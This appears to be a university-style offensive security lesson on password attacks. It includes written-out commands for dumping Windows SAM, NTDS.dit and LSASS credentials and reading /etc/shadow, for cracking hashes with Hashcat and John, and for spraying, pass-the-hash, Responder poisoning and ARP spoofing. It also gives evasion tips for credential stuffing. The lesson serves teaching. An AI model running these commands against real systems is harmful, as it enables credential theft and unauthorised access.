---
title: "Week 8 — Password Attacks & Credential Exploitation"
description: Master password cracking methodologies, hash analysis, credential spraying, and secure password storage design.
---

# Week 8 — Password Attacks & Credential Exploitation

<div class="week-meta" markdown>
**Course Objectives:** CO3 &nbsp;|&nbsp; **Focus:** Credential Attacks &nbsp;|&nbsp; **Difficulty:** ⭐⭐⭐☆☆
</div>

---

## Learning Objectives

- [ ] Identify common password hash algorithms and their relative strength
- [ ] Perform dictionary, rule-based, and mask attacks using John the Ripper and Hashcat
- [ ] Execute credential spraying and password stuffing attacks
- [ ] Extract credentials from Windows SAM, NTDS.dit, and Linux /etc/shadow
- [ ] Implement and evaluate secure password storage mechanisms

---

## 1. Password Storage Fundamentals

### 1.1 Password Hashing Algorithms

| Algorithm | Length | Cracking Speed (GPU) | Status |
|-----------|--------|---------------------|--------|
| MD5 | 128-bit | ~100 billion/sec | ❌ Broken |
| SHA-1 | 160-bit | ~10 billion/sec | ❌ Deprecated |
| SHA-256 | 256-bit | ~1 billion/sec | ⚠️ Fast — not for passwords |
| NTLM | 128-bit (MD4) | ~100 billion/sec | ❌ Broken |
| LM | 7+7 split | Instantly via rainbow tables | ❌ Completely broken |
| bcrypt | 184-bit | ~20,000/sec | ✅ Good (cost factor adjustable) |
| Argon2id | Variable | ~100/sec (with params) | ✅ Best current standard |
| PBKDF2 | Variable | ~1,000/sec | ✅ Acceptable |
| scrypt | Variable | ~1,000/sec | ✅ Memory-hard, good |

!!! warning "Speed = Weakness for Password Hashing"
    For general hashing (data integrity), speed is a virtue. For password storage, speed is a vulnerability — the faster an algorithm, the faster it can be brute-forced. Password hashing algorithms (bcrypt, Argon2id) are **deliberately slow**.

### 1.2 Windows Password Storage

```
LM Hash (legacy):
  Password split into two 7-char chunks → each converted to DES key
  Maximum effective entropy = 2 × 2^56 = ~54 bits (precomputed instantly)
  
NTLM Hash:
  MD4(password) — no salt, very fast, susceptible to rainbow tables
  Used in modern Windows for backwards compatibility
  
Where stored:
  C:\Windows\System32\config\SAM   → Local accounts (requires SYSTEM priv)
  C:\Windows\NTDS\NTDS.dit         → Domain accounts (Domain Controller only)
  Memory (LSASS process)           → Cleartext + hashes while logged in (Mimikatz target)
```

### 1.3 Linux Password Storage

```bash
# /etc/shadow format:
# username:$type$salt$hash:lastchange:min:max:warn:inactive:expire
# 
# Hash type identifiers:
# $1$  = MD5crypt
# $2a$ = bcrypt
# $5$  = SHA-256
# $6$  = SHA-512 (most common on modern Linux)
# $y$  = yescrypt (Ubuntu 22.04+)
# 
# Example:
# root:$6$salt$hashvalue:18993:0:99999:7:::
```

---

## 2. Credential Extraction

### 2.1 Windows SAM Database

```powershell
# Method 1: Volume Shadow Copy (no reboot needed)
reg save HKLM\SAM C:\sam.save
reg save HKLM\SYSTEM C:\system.save
reg save HKLM\SECURITY C:\security.save

# Offline dump with secretsdump.py
impacket-secretsdump -sam sam.save -system system.save LOCAL

# Method 2: Mimikatz (requires SYSTEM / SeDebugPrivilege)
privilege::debug
sekurlsa::logonpasswords    # Dump cleartext creds from LSASS memory
lsadump::sam                # Dump SAM hashes
lsadump::lsa /patch         # LSA secrets

# Method 3: Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\
```

### 2.2 Active Directory NTDS.dit

```powershell
# Extract from Domain Controller (requires DA privileges)
# Method 1: ntdsutil
ntdsutil
  activate instance ntds
  ifm
  create full C:\ntds_dump
  
# Method 2: secretsdump.py (remote, with DC admin creds)
impacket-secretsdump administrator:Password@192.168.1.10 -outputfile dc_hashes

# Method 3: VSS copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\
reg save HKLM\SYSTEM C:\system.save
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
```

### 2.3 Linux /etc/shadow

```bash
# Requires root
cat /etc/shadow
john /etc/shadow --wordlist=/usr/share/wordlists/rockyou.txt

# unshadow — combine passwd and shadow for john
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
```

---

## 3. Hashcat — GPU-Accelerated Cracking

### 3.1 Hash Types

```bash
# Common hashcat mode numbers (-m)
# 0    = MD5
# 100  = SHA-1  
# 1000 = NTLM
# 1800 = SHA-512 (Linux shadow $6$)
# 3200 = bcrypt
# 5600 = NetNTLMv2 (captured via Responder)
# 13100 = Kerberoast TGS tickets
# 22000 = WPA2 PMKID + Handshake

# Identify hash type
hashid 'aad3b435b51404eeaad3b435b51404ee'
# Output: [+] LM [+] NT (NTLM) [+] MD4
```

### 3.2 Attack Modes

```bash
# Dictionary attack (mode 0)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack (mode 0 + rules)
hashcat -m 1000 hashes.txt rockyou.txt -r rules/best64.rule
hashcat -m 1000 hashes.txt rockyou.txt -r rules/d3ad0ne.rule

# Common rules:
# best64.rule      → 64 most effective transformations
# OneRuleToRuleThemAll.rule → Massive comprehensive rule set
# d3ad0ne.rule     → Corporate password patterns

# Mask attack (mode 3) — brute force with pattern
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d?s
# ?u = uppercase, ?l = lowercase, ?d = digit, ?s = special, ?a = all

# Corporate password patterns:
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?d    # Word+4digits
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l!?d?d?d?d     # Word!+digits

# Combination attack (combine two wordlists)
hashcat -m 1000 hashes.txt -a 1 wordlist1.txt wordlist2.txt

# Hybrid: wordlist + mask
hashcat -m 1000 hashes.txt -a 6 rockyou.txt ?d?d?d?d     # word+4digits
hashcat -m 1000 hashes.txt -a 7 ?d?d?d?d rockyou.txt     # 4digits+word

# GPU benchmarks
hashcat -b -m 1000    # Benchmark NTLM speed
```

### 3.3 John the Ripper

```bash
# Auto-detect and crack
john hashes.txt

# Specify hash type
john --format=NT hashes.txt
john --format=sha512crypt shadow.txt

# Dictionary mode
john --wordlist=rockyou.txt --format=NT hashes.txt

# Rules
john --wordlist=rockyou.txt --rules hashes.txt

# Show cracked passwords
john --show hashes.txt

# Incremental (brute force)
john --incremental hashes.txt
```

---

## 4. Online Attacks — Spraying & Stuffing

### 4.1 Password Spraying (Low-and-Slow)

Spray one common password across **many accounts** to avoid lockout:

```bash
# Windows / Active Directory spraying
# Tool: kerbrute, spray, DomainPasswordSpray

# kerbrute — fast Kerberos-based spraying (no lockout on valid usernames)
kerbrute passwordspray -d company.com --dc 192.168.1.10 users.txt 'Winter2024!'

# CrackMapExec — SMB spraying
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password1' --continue-on-success

# O365 / Azure spraying
# MSOLSpray, o365spray
python3 o365spray.py --spray -U users.txt -p 'Autumn2024!' --domain company.com

# Timing strategy:
# Most lockout policies: 5 attempts per 30 minutes
# Wait 31+ minutes between sprays
# Target: first-business-day-of-month passwords (January2024!, Spring2024!)
```

### 4.2 Credential Stuffing

Use breach database credentials against other services:

```bash
# Hypothesis: users reuse passwords across services
# Source: breachedpasswords.com, HaveIBeenPwned data

# Tools: Snipr, OpenBullet, Sentry MBA (gray area — know your authorization)
# Always verify you have authorization for the target service

# Detection evasion:
# - Rotate IPs (proxy pools)
# - Randomize user agents
# - Add delays between attempts
# - Distribute across time zones
```

### 4.3 Pass-the-Hash (PtH)

NTLM authentication accepts the hash itself — no need to crack:

```bash
# Authenticate with hash directly (no need to crack NTLM)
impacket-psexec administrator@192.168.1.100 -hashes :aad3b435b51404eeaad3b435b51404ee

# CrackMapExec PtH
crackmapexec smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee'

# Evil-WinRM
evil-winrm -i 192.168.1.100 -u administrator -H 'NTLM_HASH'
```

---

## 5. Credential Harvesting Tools

```bash
# Responder — LLMNR/NBT-NS/MDNS poisoning → captures NetNTLMv2 hashes
# On a Windows network: ANY failed DNS lookup → Responder responds → creds captured
responder -I eth0 -rdwv

# Captured NetNTLMv2 hashes → crack with hashcat (-m 5600)
hashcat -m 5600 netntlmv2_hashes.txt rockyou.txt

# Bettercap — MitM + credential harvesting
bettercap -iface eth0
bettercap > set arp.spoof.targets 192.168.1.0/24
bettercap > arp.spoof on
bettercap > net.sniff on
```

---

## Key Vocabulary

| Term | Definition |
|------|------------|
| **NTLM** | Windows authentication protocol using MD4 hash — no salt |
| **Pass-the-Hash** | Authenticate using NTLM hash without knowing plaintext |
| **Rainbow Table** | Precomputed hash→plaintext lookup table |
| **Salt** | Random value added before hashing — defeats rainbow tables |
| **Credential Spraying** | One password tested against many accounts — avoids lockout |
| **Credential Stuffing** | Breach creds tested against other services |
| **Responder** | Tool poisoning LLMNR/NBT-NS to capture NTLMv2 hashes |
| **Kerberoasting** | Request Kerberos service tickets → offline crack (Week 10) |

---

## Review Questions

!!! question "Self-Assessment"
    1. Why is bcrypt preferred over SHA-256 for password storage, despite SHA-256 being "stronger"?
    2. You capture NTLM hashes from the SAM database. The administrator's hash is: `aad3b435b51404eeaad3b435b51404ee`. What does this tell you?
    3. Construct a Hashcat mask attack targeting corporate password patterns like "Summer2024!" and "Welcome@2024".
    4. Explain how Pass-the-Hash works and why it's effective even against properly hashed passwords.
    5. Describe the Responder attack chain — from network position to captured hash to authenticated access.

---

## Further Reading

- 📖 *Hacking Exposed 7*, Chapter 5 — "Hacking Windows"
- 📄 [Hashcat Wiki](https://hashcat.net/wiki/) — rules, masks, formats
- 📄 [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki)
- 📄 [NIST SP 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html) — Digital Identity Guidelines: Authentication
- 📄 "Password Cracking" — SANS Reading Room

---

*[← Week 7](week07.md) &nbsp;|&nbsp; [Course Index](index.md) &nbsp;|&nbsp; [Week 9 →](week09.md)*
